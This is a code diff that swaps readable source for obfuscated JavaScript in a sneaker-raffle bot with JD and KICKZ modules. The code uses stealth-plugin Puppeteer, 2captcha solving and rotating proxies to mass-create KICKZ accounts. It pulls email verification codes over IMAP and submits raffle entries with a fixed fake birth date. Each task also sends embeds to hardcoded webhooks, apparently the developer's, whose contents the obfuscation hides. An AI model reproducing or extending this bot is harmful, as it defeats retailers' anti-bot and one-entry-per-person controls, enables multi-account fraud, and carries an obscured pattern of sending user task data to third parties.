+                            console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x1515af['name'] + ']\x20Task\x20' + (_0x487d6e + 0x1) + '\x20:\x20Retrying\x20(' + _0x5bbf3b + '\x20/\x205)')), _0x487d6e = _0x487d6e - 0x1, _0x5bbf3b = _0x5bbf3b + 0x1;
+                            continue;
+                        }
+                        if (_0x52cdd5 == 'yes' && _0x5bbf3b == 0x5) {
+                            _0x5bbf3b = 0x0, _0x52cdd5 = 'no';
+                            continue;
+                        }
+                        _0x5a3161('Waiting\x20for\x20' + _0x51d52a['delay'] + '\x20ms'), await _0x116d4a(_0x51d52a['delay']);
+                    }
+                }
+            }
+        }]
+    },
+    {
+        'name': 'JD',
+        'modules': [{
+            'name': 'JD\x20Raffle\x20Entries',
+            'store': 'JD',
+            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
+            'function': async function (_0xf2c6b, _0x3a220d, _0x5276e5) {
+                var _0x128e3f = ![], _0x3bb2e2 = ![];
+                if (_0x51d52a['captchaKey'] == '' || _0x51d52a['captchaKey'] == undefined)
+                    return console['log'](_0x1403a4['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
+                _0x5d136d['use'](_0x2ce6bf()), _0x5d136d['use'](_0xe5ec8f({
+                    'provider': {
+                        'id': '2captcha',
+                        'token': '' + _0x51d52a['captchaKey']
+                    },
+                    'visualFeedback': !![]
+                }));
+                for (var _0x11f475 = 0x0; _0x11f475 < _0x3a220d['length']; _0x11f475++) {
+                    if (_0x295c4a != 'yes')
+                        var _0x295c4a = '', _0x2ba5d9 = 0x0;
+                    var _0x165e56, _0x2c383e = [{
+                        'type': 'rich',
+                        'title': 'Succesful\x20JD\x20entry',
+                        'description': '',
+                        'color': 0xc0d6d6,
+                        'fields': [
+                            {
+                                'name': 'Product',
+                                'value': '' + _0x3a220d[_0x11f475]['Url']
+                            },
+                            {
+                                'name': 'Size',
+                                'value': '' + _0x3a220d[_0x11f475]['Size']
+                            },
+                            {
+                                'name': 'User',
+                                'value': '' + _0x358285
+                            },
+                            {
+                                'name': 'Delay',
+                                'value': '' + _0x51d52a['delay']
+                            },
+                            {
+                                'name': 'Version',
+                                'value': '' + _0x3b2d4c
+                            }
+                        ]
+                    }];
+                    const _0x1257a0 = { 'embeds': _0x2c383e };
+                    _0x244762(_0xf2c6b['name'] + '\x20Task\x20' + (_0x11f475 + 0x1) + '\x20/\x20' + _0x3a220d['length'] + '\x20||\x20File:\x20' + _0x214f6f + '\x20Proxies:\x20' + _0x1d31f7);
+                    try {
+                        await _0x2c2316(_0x3a220d, _0x11f475);
+                    } catch {
+                        _0x295c4a = 'no';
+                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
+                    }
+                    var _0x57328 = await _0x2520f4(_0x3a220d[_0x11f475], _0xf2c6b, 'dev', ![]), _0x22b94a = await _0x2520f4(_0x3a220d[_0x11f475], _0xf2c6b, 'pub', ![]);
+                    const _0x5705aa = {
+                        'succesDEVMSG': { 'embeds': [_0x57328] },
+                        'succesPUBMSG': { 'embeds': [_0x22b94a] }
+                    };
+                    if (_0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '')
+                        try {
+                            await _0x3c7bbe(_0x51d52a['webhook'], _0x5705aa['succesDEVMSG']);
+                        } catch {
+                        }
+                    await _0x116d4a(0xc8), await _0x3c7bbe(_0x5317eb, _0x5705aa['succesDEVMSG']), await _0x116d4a(0xc8);
+                    try {
+                        await _0x3c7bbe(_0x55a106, _0x5705aa['succesPUBMSG']);
+                    } catch {
+                    }
+                    if (_0x3a220d[_0x11f475]['Email'] == '' || _0x3a220d[_0x11f475]['Url'] == '' || _0x3a220d[_0x11f475]['FirstName'] == '' || _0x3a220d[_0x11f475]['LastName'] == '') {
+                        console['log'](_0x3982db() + '\x20[' + _0x1a1b7d[taskModule]['name'] + ']\x20Task\x20' + (_0x11f475 + 0x1) + '\x20:\x20Invalid\x20CSV');
+                        continue;
+                    }
+                    if (_0x51d52a['useRandomProxy'] = ![])
+                        var _0x5c7f3a = _0x5276e5[_0x11f475]['split'](':');
+                    else
+                        var _0x4eef74 = Math['round'](Math['random']() * (_0x5276e5['length'] - 0x1)), _0x5c7f3a = _0x5276e5[_0x4eef74]['split'](':');
+                    var _0x236a8e;
+                    try {
+                        _0x236a8e = await _0x5d136d['launch']({
+                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
+                            'headless': !![],
+                            'args': [
+                                '--proxy-server=' + _0x5c7f3a[0x0] + ':' + _0x5c7f3a[0x1],
+                                '--no-sandbox',
+                                '--disable-setuid-sandbox'
+                            ]
+                        });
+                    } catch {
+                        _0x236a8e = await _0x5d136d['launch']({
+                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
+                            'headless': !![],
+                            'args': [
+                                '--proxy-server=' + _0x5c7f3a[0x0] + ':' + _0x5c7f3a[0x1],
+                                '--no-sandbox',
+                                '--disable-setuid-sandbox'
+                            ]
+                        });
+                    }
+                    try {
+                        const _0x26bd18 = await _0x236a8e['newPage']();
+                        await _0x26bd18['authenticate']({
+                            'username': '' + _0x5c7f3a[0x2],
+                            'password': '' + _0x5c7f3a[0x3]
+                        }), console['log'](_0x3982db() + '\x20[' + _0xf2c6b['name'] + ']\x20Task\x20' + (_0x11f475 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x26bd18['setRequestInterception'](!![]), _0x26bd18['on']('request', _0x38c032 => {
+                            _0x38c032['resourceType']() === 'image' || _0x38c032['resourceType']() === 'font' || _0x38c032['resourceType']() === 'media' ? _0x38c032['abort']() : _0x38c032['continue']();
+                        });
+                        try {
+                            await _0x26bd18['goto']('' + _0x3a220d[_0x11f475]['Url'], {
+                                'waitUntil': 'networkidle2',
+                                'timeout': 0xea60
+                            });
+                        } catch {
+                            throw new Error('Connection\x20Error');
+                        }
+                        try {
+                            await _0x26bd18['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
+                        } catch {
+                            throw new Error('Not\x20an\x20Active\x20Raffle');
+                        }
+                        console['log'](_0x3982db() + '\x20[' + _0xf2c6b['name'] + ']\x20Task\x20' + (_0x11f475 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x26bd18['type']('#comp_firstname', '' + _0x3a220d[_0x11f475]['FirstName']), await _0x26bd18['waitForSelector']('#comp_lastname'), await _0x26bd18['type']('#comp_lastname', '' + _0x3a220d[_0x11f475]['LastName']), await _0x26bd18['waitForSelector']('#comp_email'), await _0x26bd18['type']('#comp_email', '' + _0x3a220d[_0x11f475]['Email']), await _0x26bd18['waitForSelector']('#comp_paypalemail'), await _0x26bd18['type']('#comp_paypalemail', '' + _0x3a220d[_0x11f475]['Email']), await _0x26bd18['waitForSelector']('#comp_mobile_end'), await _0x26bd18['type']('#comp_mobile_end', '' + _0x3a220d[_0x11f475]['Phone']), await _0x26bd18['waitForSelector']('#comp_dob'), await _0x26bd18['type']('#comp_dob', '08/09/1992'), console['log'](_0x3982db() + '\x20[' + _0xf2c6b['name'] + ']\x20Task\x20' + (_0x11f475 + 0x1) + '\x20:\x20Choosing\x20Size');
+                        if (_0x3a220d[_0x11f475]['Size'] == 'RANDOM') {
+                            const _0x1d9d61 = await _0x26bd18['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x3b6a01 => {
+                                return _0x3b6a01['map'](_0x245b54 => _0x245b54['value']);
+                            });
+                            var _0x549e5c = Math['round'](Math['random']() * (_0x1d9d61['length'] - 0x2));
+                            await _0x26bd18['select']('#shoesize', _0x1d9d61[_0x549e5c + 0x1]), await _0x116d4a(0x3e8);
+                        } else {
+                            const _0xd81fcc = await _0x26bd18['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x125fe5 => {
+                                return _0x125fe5['map'](_0xbf9cee => _0xbf9cee['innerText']);
+                            }), _0x3e2628 = await _0x26bd18['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x27519e => {
+                                return _0x27519e['map'](_0xc17d34 => _0xc17d34['value']);
+                            });
+                            var _0x206d36 = _0x3a220d[_0x11f475]['Size'];
+                            for (var _0x5d1ba9 = 0x1; _0x5d1ba9 < _0x3e2628['length']; _0x5d1ba9++) {
+                                var _0x50e6e0 = _0xd81fcc[_0x5d1ba9]['split']('\x20')[0x0];
+                                if (_0x50e6e0 == _0x206d36) {
+                                    await _0x26bd18['select']('#shoesize', _0x3e2628[_0x5d1ba9]);
+                                    break;
+                                } else {
+                                    if (_0x5d1ba9 + 0x1 == _0x3e2628['length'])
+                                        throw new Error('Size\x20Not\x20Found..');
+                                }
+                            }
+                        }
+                        await _0x26bd18['waitForSelector']('#comp_address1'), await _0x26bd18['type']('#comp_address1', _0x3a220d[_0x11f475]['Address1'] + '\x20' + _0x3a220d[_0x11f475]['HouseNumber']), await _0x26bd18['waitForSelector']('#comp_address2'), await _0x26bd18['type']('#comp_address2', '' + _0x3a220d[_0x11f475]['Address2']), await _0x26bd18['waitForSelector']('#comp_address2'), await _0x26bd18['type']('#comp_address3', '' + _0x3a220d[_0x11f475]['City']), await _0x26bd18['waitForSelector']('#comp_postcode'), await _0x26bd18['type']('#comp_postcode', '' + _0x3a220d[_0x11f475]['Zip']), console['log'](_0x3982db() + '\x20[' + _0xf2c6b['name'] + ']\x20Task\x20' + (_0x11f475 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x116d4a(0x4b0), await _0x26bd18['click']('label#emailhold'), await _0x116d4a(0x5dc), await _0x26bd18['click']('#preauth_tandc_email\x20>\x20label'), await _0x116d4a(0x5dc), await _0x26bd18['click']('#submit');
+                        try {
+                            await _0x26bd18['waitForSelector']('#paymentWrap');
+                        } catch {
+                            throw new Error('Could\x20not\x20find\x20Payment');
+                        }
+                        console['log'](_0x3982db() + '\x20[' + _0xf2c6b['name'] + ']\x20Task\x20' + (_0x11f475 + 0x1) + '\x20:\x20' + _0x1403a4['blue']('Awaiting\x20Paypal\x20Payment')), _0x236a8e['on']('targetcreated', async _0x59b477 => {
+                            if (_0x59b477['type']() === 'page') {
+                                const _0xe3cdd5 = await _0x59b477['page']();
+                                async function _0x3ee1b6() {
+                                    try {
+                                        await _0x26bd18['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x3bb2e2 = !![];
+                                        return;
+                                    } catch {
+                                    }
+                                }
+                                async function _0x595f0a() {
+                                    try {
+                                        await _0x26bd18['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x128e3f = !![];
+                                        return;
+                                    } catch {
+                                    }
+                                }
+                                _0x595f0a(), _0x3ee1b6(), await _0x116d4a(0x493e0);
+                            }
+                        });
+                        async function _0x5c6bf8() {
+                            for (let _0x119757 = 0x0; _0x119757 < 0x12c; _0x119757++) {
+                                if (_0x128e3f == !![]) {
+                                    _0x295c4a = 'no', _0x523ce4(_0x3a220d[_0x11f475], _0xf2c6b), console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0xf2c6b['name'] + ']\x20Task\x20' + (_0x11f475 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
+                                    if (_0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '')
+                                        try {
+                                            await _0x3c7bbe(_0x51d52a['webhook'], _0x5705aa['succesDEVMSG']);
+                                        } catch {
+                                        }
+                                    await _0x116d4a(0xc8), await _0x3c7bbe(_0x5317eb, _0x5705aa['succesDEVMSG']), await _0x116d4a(0xc8);
+                                    try {
+                                        await _0x3c7bbe(_0x55a106, _0x5705aa['succesPUBMSG']);
+                                    } catch {
+                                    }
+                                    return;
+                                } else {
+                                    if (_0x3bb2e2)
+                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
+                                    else
+                                        await _0x116d4a(0x3e8);
+                                }
+                            }
+                            throw new Error('Paypal\x20Error');
+                        }
+                        await _0x116d4a(0xbb8), await _0x26bd18['click']('.zoid-outlet'), await _0x116d4a(0x7d0), await _0x5c6bf8();
+                    } catch (_0x281b9c) {
+                        console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0xf2c6b['name'] + ']\x20Task\x20' + (_0x11f475 + 0x1) + '\x20:\x20' + _0x281b9c)), _0x165e56 = '' + _0x281b9c;
+                        var _0x30d336 = await _0x2520f4(_0x3a220d[_0x11f475], _0xf2c6b, 'dev', !![], _0x165e56);
+                        _0x5705aa['errorDEV'] = { 'embeds': [_0x30d336] }, _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x5705aa['errorDEV']), await _0x3c7bbe(_0x802c1e, _0x5705aa['errorDEV']);
+                    } finally {
+                        _0x236a8e && _0x236a8e['close']();
+                        if (_0x295c4a == 'yes' && _0x2ba5d9 != 0x5 && _0x165e56 != 'Size\x20Not\x20Found') {
+                            console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0xf2c6b['name'] + ']\x20Task\x20' + (_0x11f475 + 0x1) + '\x20:\x20Retrying\x20(' + _0x2ba5d9 + '\x20/\x205)')), _0x11f475 = _0x11f475 - 0x1, _0x2ba5d9 = _0x2ba5d9 + 0x1;
+                            continue;
+                        }
+                        _0x295c4a == 'yes' && _0x2ba5d9 >= 0x5 && (_0x5925c7(afew[_0x11f475], _0xf2c6b), _0x295c4a = 'no', _0x2ba5d9 = 0x0), console['log']('Waiting\x20for\x20' + _0x51d52a['delay'] + '\x20ms'), await _0x116d4a(_0x51d52a['delay']);
+                    }
+                }
+            }
+        }]
+    },
+    {
+        'name': 'KICKZ',
+        'modules': [
+            {
+                'name': 'KICKZ\x20Account\x20Generator',
+                'store': 'KICKZ',
+                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
+                'function': async function (_0x541428, _0x25ee82, _0x5db278) {
+                    _0x5d136d['use'](_0x2ce6bf()), _0x5d136d['use'](_0xe5ec8f({
+                        'provider': {
+                            'id': '2captcha',
+                            'token': '' + _0x51d52a['captchaKey']
+                        },
+                        'visualFeedback': !![]
+                    }));
+                    for (var _0x1c5064 = 0x0; _0x1c5064 < _0x25ee82['length']; _0x1c5064++) {
+                        const _0x11953c = 'https://www.kickz.com/login';
+                        if (_0x54fb5f != 'yes')
+                            var _0x54fb5f = '', _0x250ba9 = 0x0;
+                        _0x244762(_0x541428['name'] + '\x20Task\x20' + (_0x1c5064 + 0x1) + '\x20/\x20' + _0x25ee82['length'] + '\x20||\x20File:\x20' + _0x214f6f + '\x20Proxies:\x20' + _0x1d31f7);
+                        try {
+                            await _0x2c2316(_0x25ee82, _0x1c5064);
+                        } catch {
+                            _0x54fb5f = 'no';
+                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
+                        }
+                        var _0x2ae6bd = [{
+                            'type': 'rich',
+                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
+                            'description': '',
+                            'color': 0xc0d6d6,
+                            'fields': [
+                                {
+                                    'name': 'User',
+                                    'value': '' + _0x358285
+                                },
+                                {
+                                    'name': 'Delay',
+                                    'value': '' + _0x51d52a['delay']
+                                },
+                                {
+                                    'name': 'Version',
+                                    'value': '' + _0x3b2d4c
+                                }
+                            ]
+                        }];
+                        const _0xd3594 = { 'embeds': _0x2ae6bd };
+                        var _0x15c12c = await _0x2520f4(_0x25ee82[_0x1c5064], _0x541428, 'acc', ![]);
+                        const _0x1b71f7 = { 'succesDEVMSG': { 'embeds': [_0x15c12c] } };
+                        if (_0x25ee82[_0x1c5064]['Email'] == '' || _0x25ee82[_0x1c5064]['FirstName'] == '' || _0x25ee82[_0x1c5064]['LastName'] == '') {
+                            console['log'](_0x3982db() + '\x20[' + _0x541428['name'] + ']\x20Task\x20' + (_0x1c5064 + 0x1) + '\x20:\x20Invalid\x20CSV');
+                            continue;
+                        }
+                        _0x25ee82[_0x1c5064]['Password'] == '' && (_0x25ee82[_0x1c5064]['Password'] = 'JRaffles23!');
+                        if (_0x51d52a['useRandomProxy'] = ![])
+                            var _0x2cf340 = _0x5db278[_0x1c5064]['split'](':');
+                        else
+                            var _0x1a29c3 = Math['round'](Math['random']() * (_0x5db278['length'] - 0x1)), _0x2cf340 = _0x5db278[_0x1a29c3]['split'](':');
+                        var _0x11e51e;
+                        try {
+                            _0x11e51e = await _0x5d136d['launch']({
+                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
+                                'headless': !![],
+                                'args': [
+                                    '--proxy-server=' + _0x2cf340[0x0] + ':' + _0x2cf340[0x1],
+                                    '--no-sandbox',
+                                    '--disable-setuid-sandbox'
+                                ]
+                            });
+                        } catch {
+                            _0x11e51e = await _0x5d136d['launch']({
+                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
+                                'headless': !![],
+                                'args': [
+                                    '--proxy-server=' + _0x2cf340[0x0] + ':' + _0x2cf340[0x1],
+                                    '--no-sandbox',
+                                    '--disable-setuid-sandbox'
+                                ]
+                            });
+                        }
+                        try {
+                            const _0x5d1f40 = await _0x11e51e['newPage']();
+                            await _0x5d1f40['authenticate']({
+                                'username': '' + _0x2cf340[0x2],
+                                'password': '' + _0x2cf340[0x3]
+                            }), console['log'](_0x3982db() + '\x20[' + _0x541428['name'] + ']\x20Task\x20' + (_0x1c5064 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5d1f40['setRequestInterception'](!![]), _0x5d1f40['on']('request', _0x4e3d43 => {
+                                _0x4e3d43['resourceType']() === 'image' || _0x4e3d43['resourceType']() === 'font' || _0x4e3d43['resourceType']() === 'media' ? _0x4e3d43['abort']() : _0x4e3d43['continue']();
+                            }), await _0x5d1f40['goto'](_0x11953c), await _0x116d4a(0xbb8), console['log'](_0x3982db() + '\x20[' + _0x541428['name'] + ']\x20Task\x20' + (_0x1c5064 + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x5d1f40['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x5d1f40['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x5d1f40['waitForSelector']('#button-register'), await _0x116d4a(0x7d0), await _0x5d1f40['evaluate'](() => {
+                                const _0x30bc7b = document['querySelector']('#button-register');
+                                _0x30bc7b['click']();
+                            }), console['log'](_0x3982db() + '\x20[' + _0x541428['name'] + ']\x20Task\x20' + (_0x1c5064 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x116d4a(0x1388), await _0x5d1f40['waitForSelector']('#customer_salutation'), await _0x5d1f40['select']('#customer_salutation', 'mr'), await _0x116d4a(0x7d0), await _0x5d1f40['waitForSelector']('#customer_firstname'), await _0x5d1f40['type']('#customer_firstname', '' + _0x25ee82[_0x1c5064]['FirstName']), await _0x116d4a(0x352), await _0x5d1f40['waitForSelector']('#customer_lastname'), await _0x5d1f40['type']('#customer_lastname', '' + _0x25ee82[_0x1c5064]['LastName']), await _0x116d4a(0x352), await _0x5d1f40['type']('#email-input', '' + _0x25ee82[_0x1c5064]['Email']), await _0x116d4a(0x352), await _0x5d1f40['type']('#email-confirm-input', '' + _0x25ee82[_0x1c5064]['Email']), await _0x116d4a(0x352), await _0x5d1f40['type']('#register-password', '' + _0x25ee82[_0x1c5064]['Password']), await _0x116d4a(0x352), await _0x5d1f40['type']('#password-confirm', '' + _0x25ee82[_0x1c5064]['Password']), await _0x116d4a(0x352), console['log'](_0x3982db() + '\x20[' + _0x541428['name'] + ']\x20Task\x20' + (_0x1c5064 + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x5d1f40['click']('#consent'), await _0x116d4a(0x1f4);
+                            const _0x31e6e4 = await _0x5d1f40['$']('div.inputErrorMsg.b-form_section-message');
+                            if (_0x31e6e4) {
+                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x541428['name'] + ']\x20Task\x20' + (_0x1c5064 + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
+                                continue;
+                            }
+                            await _0x5d1f40['click']('#buttonRegister');
+                            try {
+                                await _0x5d1f40['waitForSelector']('#verificationCode');
+                            } catch {
+                                throw new Error('Account\x20already\x20registered');
+                            }
+                            console['log'](_0x3982db() + '\x20[' + _0x541428['name'] + ']\x20Task\x20' + (_0x1c5064 + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x25ee82[_0x1c5064]['Email']), await _0x116d4a(0x4b0);
+                            async function _0x1eaa52() {
+                                var _0x342f7b, _0x1b871e = ![];
+                                for (var _0x5ecdf7 = 0x0; _0x5ecdf7 < 0x18; _0x5ecdf7++) {
+                                    async function _0x3d7a3d() {
+                                        var _0x2f9091 = new _0x3e4e8d({
+                                            'user': _0x51d52a['masterMail'],
+                                            'password': _0x51d52a['masterPassword'],
+                                            'host': 'imap.gmail.com',
+                                            'port': 0x3e1,
+                                            'tls': !![],
+                                            'autotls': 'always'
+                                        });
+                                        function _0x1f4674(_0x47a25e) {
+                                            _0x2f9091['openBox']('INBOX', ![], _0x47a25e);
+                                        }
+                                        _0x2f9091['once']('ready', function () {
+                                            console['log'](_0x3982db() + '\x20[' + _0x541428['name'] + ']\x20Task\x20' + (_0x1c5064 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x1f4674(function (_0x139125, _0x2240f1) {
+                                                console['log'](_0x3982db() + '\x20[' + _0x541428['name'] + ']\x20Task\x20' + (_0x1c5064 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
+                                                if (_0x139125)
+                                                    throw _0x139125;
+                                                _0x2f9091['seq']['search']([
+                                                    'UNSEEN',
+                                                    [
+                                                        'FROM',
+                                                        'verification@kickz.com'
+                                                    ]
+                                                ], function (_0x12b506, _0x499a73) {
+                                                    if (!_0x499a73 || !_0x499a73['length'])
+                                                        console['log'](_0x3982db() + '\x20[' + _0x541428['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x2f9091['end']();
+                                                    else {
+                                                        var _0xc4670b = _0x2f9091['seq']['fetch'](_0x499a73, {
+                                                            'bodies': '',
+                                                            'markSeen': !![]
+                                                        });
+                                                        _0xc4670b['on']('message', function (_0x4b7dea, _0x400946) {
+                                                            var _0x11f135 = '(#' + _0x400946 + ')\x20';
+                                                            _0x4b7dea['on']('body', function (_0xaaab1d, _0x5735a9) {
+                                                                _0x300bc8(_0xaaab1d, (_0x2a60fa, _0x5de516) => {
+                                                                    if (_0x5de516['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
+                                                                        var _0x285b5e = _0x5de516['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x266c84 = _0x285b5e[0x1]['split']('<')[0x0];
+                                                                        _0x342f7b = _0x266c84;
+                                                                    }
+                                                                });
+                                                            }), _0x4b7dea['once']('end', function () {
+                                                            });
+                                                        }), _0xc4670b['once']('error', function (_0x3445bd) {
+                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
+                                                        }), _0xc4670b['once']('end', function () {
+                                                            _0x2f9091['end']();
+                                                        });
+                                                    }
+                                                });
+                                            });
+                                        }), _0x2f9091['once']('error', function (_0x3c05ea) {
+                                            console['log'](_0x1403a4['red'](_0x3c05ea['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x1b871e = !![];
+                                        }), _0x2f9091['once']('end', async function () {
+                                        }), _0x2f9091['connect']();
+                                    }
+                                    _0x3d7a3d(), await _0x116d4a(0x1388);
+                                    if (_0x342f7b)
+                                        return _0x342f7b;
+                                    if (_0x1b871e)
+                                        throw new Error('Error\x20connecting\x20to\x20imap');
+                                    if (_0x5ecdf7 == 0x18)
+                                        throw new Error('Mail\x20not\x20found');
+                                }
+                            }
+                            ;
+                            code = await _0x1eaa52(), _0x116d4a(0x320), console['log'](_0x3982db() + '\x20[' + _0x541428['name'] + ']\x20Task\x20' + (_0x1c5064 + 0x1) + '\x20:\x20Verifying..'), await _0x5d1f40['type']('#verificationCode', code), await _0x116d4a(0x1f4), await _0x5d1f40['click']('#buttonVerify'), await _0x116d4a(0x190), await _0x5d1f40['click']('#buttonVerify'), await _0x116d4a(0x3e8);
+                            try {
+                                await _0x5d1f40['waitForSelector']('div.b-user_greeting'), _0x54fb5f = 'no', console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0x541428['name'] + ']\x20Task\x20' + (_0x1c5064 + 0x1) + '\x20:\x20Account\x20' + _0x25ee82[_0x1c5064]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x65e0bc['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x25ee82[_0x1c5064]['Email'] + ',' + _0x25ee82[_0x1c5064]['Password'] + ','), console['log'](_0x3982db() + '\x20[' + _0x541428['name'] + ']\x20Task\x20' + (_0x1c5064 + 0x1) + '\x20:\x20Account\x20' + _0x25ee82[_0x1c5064]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
+                                try {
+                                    _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x1b71f7['succesDEVMSG']);
+                                } catch {
+                                }
+                                await _0x3c7bbe(_0x431ce7, _0x1b71f7['succesDEVMSG']);
+                            } catch {
+                                _0x54fb5f = 'no', console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x541428['name'] + ']\x20Task\x20' + (_0x1c5064 + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x541428['name'] + ']\x20Task\x20' + (_0x1c5064 + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
+                            }
+                        } catch (_0x591918) {
+                            console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x541428['name'] + ']\x20Task\x20' + (_0x1c5064 + 0x1) + '\x20:\x20' + _0x591918)), _0x2ae6bd[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x2ae6bd[0x0]['description'] = '' + _0x591918, await _0x3c7bbe(_0x802c1e, _0xd3594), _0x54fb5f = 'yes';
+                        } finally {
+                            _0x11e51e && _0x11e51e['close']();
+                            if (_0x54fb5f == 'yes' && _0x250ba9 != 0x5) {
+                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x541428['name'] + ']\x20Task\x20' + (_0x1c5064 + 0x1) + '\x20:\x20Retrying\x20(' + _0x250ba9 + '\x20/\x205)')), _0x1c5064 = _0x1c5064 - 0x1, _0x250ba9 = _0x250ba9 + 0x1;
+                                continue;
+                            }
+                            _0x54fb5f == 'yes' && _0x250ba9 >= 0x5 && (_0x5925c7(_0x25ee82[_0x1c5064], _0x541428), _0x54fb5f = 'no', _0x250ba9 = 0x0), console['log']('Waiting\x20for\x20' + _0x51d52a['delay'] + '\x20ms'), await _0x116d4a(_0x51d52a['delay']);
                         }
                     }
                 }
             },
             {
-                name: 'KICKZ Raffle Entries',
-                store: 'KICKZ',
-                logo: 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
-                function: async function (currentFunction, kickz, proxies) {
-                    puppeteer.use(StealthPlugin());
-                    puppeteer.use(RecaptchaPlugin({
-                        provider: {
-                            id: '2captcha',
-                            token: `${settings.captchaKey}` // REPLACE THIS WITH YOUR OWN 2CAPTCHA API KEY ⚡
+                'name': 'KICKZ\x20Raffle\x20Entries',
+                'store': 'KICKZ',
+                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
+                'function': async function (_0x59e332, _0x453f92, _0x164140) {
+                    _0x5d136d['use'](_0x2ce6bf()), _0x5d136d['use'](_0xe5ec8f({
+                        'provider': {
+                            'id': '2captcha',
+                            'token': '' + _0x51d52a['captchaKey']
                         },
-                        visualFeedback: true
-                    }))
-                    for (var i = 0; i < kickz.length; i++) {
-                        var ERROR;
-                        if (retry != 'yes') {
-                            var retry = '';
-                            var t = 0;
-
-                        }
-                        setTitle(`${currentFunction.name} Task ${i + 1} / ${kickz.length} || File: ${currentFile} Proxies: ${currentProxy}`);
-                        var embed = [
-                            {
